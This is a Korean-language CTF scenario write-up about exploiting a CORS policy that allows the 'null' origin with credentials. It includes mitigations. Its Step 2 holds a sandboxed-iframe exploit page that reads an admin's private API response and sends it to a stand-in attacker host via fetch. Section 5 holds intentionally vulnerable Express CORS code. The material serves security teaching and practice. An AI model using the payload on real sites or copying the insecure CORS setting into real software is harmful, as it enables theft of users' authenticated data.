---
title: CORS Misconfiguration (Null Origin) Abuse — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, cors, null-origin, misconfiguration, data-exfiltration, client-side]
confidence: high
---

# CORS Misconfiguration (Null Origin) Abuse — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Private Message Center (비공개 메시지 보관소)
- **난이도**: Medium-High
- **핵심 컨셉**: 웹 브라우저의 교차 출처 리소스 공유(CORS) 정책 설정 오류를 악용하는 **CORS Null Origin 우회 및 데이터 탈취** 취약점 문제입니다. 대상 API 서버는 외부 도메인에 자원을 제공하기 위해 와일드카드(`*`) 대신, 보안을 철저히 하려는 의도로 특정 신뢰 관계 또는 **`null` 오리진**에 대한 접근을 명시적으로 허용(`Access-Control-Allow-Origin: null`)하는 잘못된 설정을 채택했습니다. 공격자는 샌드박싱된 `<iframe>` 요소나 특정 리디렉션을 사용할 때 브라우저가 `Origin: null` 헤더를 전송하는 성질을 이용해 CORS 통제망을 무력화하고 관리자의 프라이빗 API 세션 데이터를 공격자 도메인으로 가로챕니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Target API Service**: 
  - 관리자 메시지를 반환하는 `/api/messages` API 제공 (쿠키 인증 기반).
  - CORS 헤더 설정:
    `Access-Control-Allow-Origin: null`
    `Access-Control-Allow-Credentials: true` (인증 세션 쿠키 전달 수용)
- **Flag 위치**:
  - 관리자 세션이 `/api/messages`를 조회했을 때 응답으로 리턴되는 JSON 데이터 본문 속 플래그.

### 2.2 취약점 지점
1. **Insecure Access-Control-Allow-Origin: null Configuration**:
   - 개발자는 로컬 파일(`file://`) 테스트 요청이나 로컬 임시 오리진의 요청을 수용하기 위해 `null` 오리진을 허용 리스트에 잔존시켰습니다.
   - 브라우저 스펙 상, 샌드박스 속성이 부여된 iframe(`iframe sandbox`) 안에서 cross-origin 요청을 보내면 `Origin` 헤더 주소가 본래 도메인이 아닌 `null`로 자동 채워져 전송됩니다.
   - 서버는 `Origin: null`을 보고 신뢰할 수 있는 요청으로 판별하여, 인증 쿠키를 포함한 응답을 브라우저에 넘겨주며 자바스크립트에 의한 데이터 접근 권한을 최종적으로 허용합니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 요청 헤더 | 반환 CORS 헤더 | 비고 |
|------------|--------|------|-----------|---------------|------|
| `/api/messages` | GET | 세션 필요 | `Origin: null` | `Access-Control-Allow-Origin: null` | 민감한 기밀 데이터를 노출하는 API 지점 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. CORS 정책 진단
공격자는 타겟 API에 임의의 `Origin` 헤더를 기입하여 반환되는 CORS 정책을 분석합니다.
- *요청 1 (임의 오리진)*:
  ```http
  GET /api/messages HTTP/1.1
  Host: api.challenge.local
  Origin: http://attacker.local
  ```
  -> *반환*: (CORS 헤더 없음)
- *요청 2 (Null 오리진)*:
  ```http
  GET /api/messages HTTP/1.1
  Host: api.challenge.local
  Origin: null
  ```
  -> *반환*:
  ```http
  Access-Control-Allow-Origin: null
  Access-Control-Allow-Credentials: true
  ```
  CORS Null 및 Credentials 정책이 모두 만족되어, `null` 오리진 환경 하에서 중요 인증 데이터 취득 기회가 열렸음을 확인합니다.

### Step 2. Sandboxed iframe 익스플로잇 페이지 작성
브라우저 보안 규칙 상 일반 스크립트는 `Origin: null`을 가질 수 없지만, iframe의 `sandbox="allow-scripts allow-top-navigation"` 속성을 활성화하면 브라우저가 해당 프레임 내부에서 나가는 API 호출의 Origin을 강제로 `null`로 매핑합니다.
- **공격용 HTML 페이로드 (`exploit.html`)**:
  ```html
  <!DOCTYPE html>
  <html>
  <body>
      <!-- sandbox 속성을 주어 Origin 헤더를 null로 만듬 -->
      <iframe sandbox="allow-scripts" srcdoc="
          <script>
              var xhr = new XMLHttpRequest();
              // 인증 세션 쿠키를 함께 전송하도록 설정
              xhr.withCredentials = true;
              xhr.open('GET', 'http://api.challenge.local/api/messages', true);
              xhr.onload = function() {
                  // 유출 결과 데이터를 공격자 리시버로 송출
                  fetch('http://attacker.local/log?data=' + btoa(xhr.responseText));
              };
              xhr.send();
          </script>
      "></iframe>
  </body>
  </html>
  ```

### Step 3. 피해자 링크 접속 유도
1. 공격자는 이 공격용 `exploit.html` 파일을 외부 서버(`http://attacker.local/exploit.html`)에 등록합니다.
2. 관리자 봇에 해당 페이지의 링크 주소를 전달하여 방문하게 유도합니다.

### Step 4. flag 획득
관리자 봇의 브라우저가 이 페이지를 열면, iframe 내의 스크립트가 실행됩니다. 
브라우저는 `Origin: null`을 헤더로 달고 어드민의 쿠키와 함께 `/api/messages` 요청을 전송하고, API 서버는 이를 허용하여 응답을 돌려줍니다. 
자바스크립트가 응답 텍스트에 접근하여 값을 복제하고 공격자 서버 리시버로 전송하게 되며, 공격자는 디코딩된 데이터에서 플래그(`FLAG{cors_null_origin_sandbox_bypass_stealing}`)를 획득합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Node.js Express)

```javascript
// server.js (Express CORS 취약 설정 예시)
const express = require('express');
const cookieParser = require('cookie-parser');
const app = express();

app.use(cookieParser());

// 취약한 CORS 설정 미들웨어
app.use((req, res, next) => {
    const origin = req.headers.origin;
    
    // 취약점 지점: Origin이 null인 경우를 허용 리스트에 등록
    // 일반적으로 개발 단계의 로컬 파일(file://) 조회를 임시로 열어두려다 실수로 방치됨
    if (origin === 'null') {
        res.setHeader('Access-Control-Allow-Origin', 'null');
        res.setHeader('Access-Control-Allow-Credentials', 'true');
        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
        res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    }
    
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

app.get("/api/messages", (req, res) => {
    // 관리자 세션 쿠키 여부 검증
    const sessionToken = req.cookies.admin_session;
    if (sessionToken !== "valid_admin_token_xyz") {
        return res.status(401).json({ error: "Unauthorized" });
    }
    
    // 기밀 데이터 응답 반환
    return res.json({
        status: "success",
        messages: [
            { id: 1, text: "System check completed." },
            { id: 2, text: "Secret Flag is: FLAG{cors_null_origin_sandbox_bypass_stealing}" }
        ]
    });
});

app.listen(8080);
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **`null` 오리진의 허용 리스트 배제 (Never Allow 'null' Origin)**:
   - CORS 허용 정책 목록에서 `null` 값에 대한 체크 및 매핑 설정을 완전히 제거합니다.
   - 로컬 테스트 목적으로 필요하다면 특정 호스트 IP 주소(예: `http://localhost:3000`)를 명확하게 기입해야 합니다.
2. **동적 Origin 화이트리스트 검증**:
   - `Access-Control-Allow-Origin`을 클라이언트의 요청 오리진으로 자동 매핑해 주는 설정을 배제하고, 서버가 보유한 신뢰 가능한 도메인 도메인 화이트리스트 배열과 완전 1대1 매칭되는 경우에만 동적으로 헤더를 설정합니다.
3. **CORS credentials 권장 보안 통제**:
   - 자원 노출 등 민감 API의 경우 되도록 `Access-Control-Allow-Credentials: true` 설정을 사용하지 않고, 요청 시 커스텀 Authorization 헤더(Bearer 토큰 형식 등)를 클라이언트가 달아서 통신하도록 유도하여 크로스 사이트 도킹 요청을 무력화합니다.
